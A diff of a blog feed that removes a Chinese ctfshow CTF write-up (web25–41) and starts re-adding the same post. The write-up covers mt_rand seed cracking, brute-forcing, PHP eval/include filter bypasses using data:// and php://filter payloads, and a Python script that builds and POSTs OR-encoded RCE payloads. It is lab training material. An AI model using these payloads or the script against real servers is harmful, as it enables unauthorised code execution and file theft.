-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">工具地址：https:&#x2F;&#x2F;github.com&#x2F;Al1ex&#x2F;php_mt_seed</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/_0%286QB7%245ME%24XVJ%5B2P8HMT0.png" alt=""><br>
-得到种子为4188754181，因为$_COOKIE[‘token’]的值要等于两个随机数相加，于是我们写个脚本</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：dota_st</span></span><br><span class="line"><span class="comment"> * Date：2021/2/2   11:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">4188754181</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$result = mt_rand()+mt_rand();</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/LH_7%246BHAF3_G2K%24SH7_240.png" alt=""><br>
-得到token的值为2504830688</p>
-<blockquote>
-<p>所以开始构造<br>
-第一个，构造?r=86715576，使得$rang=0，满足if((!$rand))，进入下一层if判断token的值<br>
-第二个，构造cookie头里的token=2504830688</p>
-</blockquote>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/_LWI%60Z57MJJ6T~63%25%28%29F4Z5.png" alt=""><br>
-成功拿到flag</p>
-<h3 id="web26"><a class="header-anchor" href="#web26">¶</a>web26</h3>
-<p>打开页面，看到一个网站<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/1XQD%5DP2%29%60E%24E61~M4R5D%25%5BT.png" alt=""><br>
-右键查看源码，发现存在一个checkdb.php<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/P%7BD~2I33%245_RB%25ZPCX8%60L%60E.png" alt=""><br>
-照这个格式post发送数据，得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/V0HXO4ABATGZ%7DPSLWUN969R.png" alt=""></p>
-<h3 id="web27"><a class="header-anchor" href="#web27">¶</a>web27</h3>
-<p>打开依然是一个cms<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/BP6EY%25%258HNQ%25QSL_HNCTKGH.png" alt=""><br>
-点击录取名单，下载得到一份名单<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/813HRBR%251X85L42%28FAI%298N3.png" alt=""><br>
-发现身份证中间少了日期，继续回到页面，点击查询系统<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/AKL~%60%24QE%7DN%28F9E12TH%28IF03.png" alt=""><br>
-需要输入姓名和身份证，我们现在有了姓名，身份证模糊，那进行抓包爆破<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/L%7D%28%25%40L7MXJ%40%60L%60ZE6ELV7OC.png" alt=""><br>
-设置一下爆破身份证中的日期<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/3328122SZ%5DDZ1A%283D9T1%290S.png" alt=""><br>
-爆破结果<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/9STH6184%7DTQ%60%5DJTBMYXLM%40R.png" alt=""><br>
-解码一下<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/J%5D4371%5D%28~B5%29O4%5D%4070%5B%28V%7BH.png" alt=""><br>
-得到身份证号和学号，然后去首页登录一下，得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/HP%7B%29%24%246%28%29%40%5D80BW%7B%25BRO%5DFC.png" alt=""></p>
-<h3 id="web28"><a class="header-anchor" href="#web28">¶</a>web28</h3>
-<p>打开页面，没发现什么有用的信息，但是观察到url有些奇怪<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/R%7DN~3OR%24%29AYK3ZR%40KE_%28Z%24Y.png" alt=""><br>
-应该是爆破目录，抓包一下<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/L%7BZ%25%5BNXER14_RH%7DI~K7I%40EP.png" alt=""><br>
-两个payload都选择0到100进行爆破<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/F%28_C2B6B%60Q%24%25N~8VF%7BCZ~%258.png" alt=""><br>
-在爆破结果中得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/%5D3HMWR%29%7B%60I%60V8~D~987Z5WS.png" alt=""></p>
-<h2 id="命令执行-29-124"><a class="header-anchor" href="#命令执行-29-124">¶</a>命令执行(29-124)</h2>
-<h3 id="web29"><a class="header-anchor" href="#web29">¶</a>web29</h3>
-<p>源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>首先先system(“ls”);查看一下文件<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/K%24S4PZ%5BAUUD6HI4V3BU%24%5BAW.png" alt=""><br>
-既然过滤了flag，那我们就fla*的形式进行匹配，结合tac命令输出flag.php文件内容<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/PSF%24%29E%25DF_X2Q5%7DKHS%60%7DEVR.png" alt=""></p>
-<h3 id="web30"><a class="header-anchor" href="#web30">¶</a>web30</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里把system命令给过滤了，不过有别的姿势，例如</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac *&#96;;</span><br></pre></td></tr></table></figure>
-<p>还是使用通配符进行匹配，不过换了echo进行输出<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web30/DY%28YYO%60%7DR_2%293%60MF2J%400A51.png" alt=""></p>
-<h3 id="web31"><a class="header-anchor" href="#web31">¶</a>web31</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里开始过滤了空格，本来我是使用%20编码绕过的不知道为什么不行(有点疑惑)，然后就改用了%09</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo%09&#96;tac%09*&#96;;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web31/MPL%7BFEDQ%40VS%28C%5DK%24%60IZPGX3.png" alt=""></p>
-<h3 id="web32"><a class="header-anchor" href="#web32">¶</a>web32</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这次把反引号和echo都过滤了，不过还有新姿势，利用include函数(还有require也可以)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_POST[a]?&gt;</span><br><span class="line"></span><br><span class="line">post:a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web32/Z2ILTYJZF_YO%40_2%28%7BP0GY%5B2.png" alt=""><br>
-把base64解码后即可得到flag</p>
-<h3 id="web33"><a class="header-anchor" href="#web33">¶</a>web33</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这次多过滤了双引号，继续使用上一题的payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h3 id="web34"><a class="header-anchor" href="#web34">¶</a>web34</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>多过滤一个:号，还是可以使用上一题的payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h3 id="web35"><a class="header-anchor" href="#web35">¶</a>web35</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>多过滤一个&lt;号和一个=号，不过没有影响，继续使用前面的payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h3 id="web36"><a class="header-anchor" href="#web36">¶</a>web36</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这次增加过滤数字，但还是没有影响，继续使用前面payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h3 id="web37"><a class="header-anchor" href="#web37">¶</a>web37</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>换新题了，这次是使用了include语句，这里过滤了flag，我们采用伪协议data的方法进行绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web37/%5DJ0%28I6%7BNZRUAD3WLGORLO%604.png" alt=""></p>
-<h3 id="web38"><a class="header-anchor" href="#web38">¶</a>web38</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这次在前面基础上过滤了php和file，对我们无碍，因为我们使用的是php短标签，所以继续使用上面的payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="web39"><a class="header-anchor" href="#web39">¶</a>web39</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这次减少了过滤，但是会再后面加上.php的后缀，然而我们前面的payload结尾是有一个?&gt;进行了标签闭合，所以?&gt;.php没有影响，继续使用前面payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="web40"><a class="header-anchor" href="#web40">¶</a>web40</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里回到eval语句执行命令，但过滤了许多东西，没有过滤掉英文的()，那我们使用无参数的rce进行构造读取文件</p>
-<blockquote>
-<p>print_r(scandir(‘.’));      查看当前目录下的所有文件名</p>
-<p>localeconv() 				函数返回一包含本地数字及货币格式信息的数组。</p>
-<p>current() 					  函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</p>
-</blockquote>
-<p>我们先打印出当前目录下的文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/NHDM7A4%5BNQ%5BU3%25S%401W%60%24R2P.png" alt=""><br>
-读取目录文件后，发现输出的是数组，而文件名是数组中的值，下一步我们需要取出想要读取文件的数组</p>
-<blockquote>
-<p>each()        返回数组中当前的键/值对并将数组指针向前移动一步<br>
-end()          将数组的内部指针指向最后一个单元<br>
-next()         将数组中的内部指针向前移动一位<br>
-prev()         将数组中的内部指针倒回一位<br>
-array_reverse() 	以相反的元素顺序返回数组</p>
-</blockquote>
-<p>需要知识点齐了，观察flag.php在倒数第二位，我们开始构造</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/AKO6S7Q%24R_EJ%5B6Q13BEICQ9.png" alt=""></p>
-<h3 id="web41"><a class="header-anchor" href="#web41">¶</a>web41</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>过滤了数字和字母还有一些其他符号，但我们可以利用或运算符进行构造payload进行命令执行<br>
-思路：</p>
-<blockquote>
-<p>通俗解释：<br>
-例如源码中禁止我们使用了数字3，也就是ascii码值为51，我们可以使用或运算符在没有被禁止的字符中构造出51来，比如19和32没有被禁止，我们进行与运算19|32=51，就可以获得51这个ascii码值，也就是成功得到了数字3</p>
-</blockquote>
-<p>知道了方法后，我们从ascii码表，也就是0-255中找到没有被过滤的字符进行或运算，以寻求得到我们想要的字符<br>
-结合了yu师傅给出的exp，我们写一个可利用脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span>(len(argv)!=<span class="number">2</span>):</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    print(<span class="string">&#x27;USER:python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;eg:  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;exit: input exit in function&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成可用的字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i | j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#根据输入的命令在生成的txt中进行匹配</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    s2=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f=open(<span class="string">&quot;rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t=f.readline()</span><br><span class="line">            <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">                s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your function：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your command：&quot;</span>)</span><br><span class="line">        param=action(s1) + action(s2)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
-<p>运行后，输入命令得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/%7DG%40_KOG%24CK29%60OW%5BQEF%5DQMR.png" alt=""></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>卷积神经网络结合burpsuite实现渗透测试中的验证码爆破</title>
     <url>/posts/37998/</url>
     <content><![CDATA[<h1>前言</h1>
@@ -1748,6 +1408,441 @@ array_reverse() 	以相反的元素顺序返回数组</p>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/YY4%24SZRJG~%7DGSJ%5DHWPE~6XO.png" alt=""></p>
 </li>
 </ul>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web1000题系列修炼(一)</title>
+    <url>/posts/14827/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>这个web系列题是前些日子我随意逛逛的时候，在ctfshow平台上发现的，正好web太菜了，借由这个系列题开始自我修炼吧😖</p>
+<h2 id="信息收集-1-20"><a class="header-anchor" href="#信息收集-1-20">¶</a>信息收集(1-20)</h2>
+<h3 id="web1"><a class="header-anchor" href="#web1">¶</a>web1</h3>
+<p>右键查看源码就能看到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web1/%24A%60L%5D%280Z%28L%24%5DUO3%60QC03%5B0K.png" alt=""></p>
+<h3 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h3>
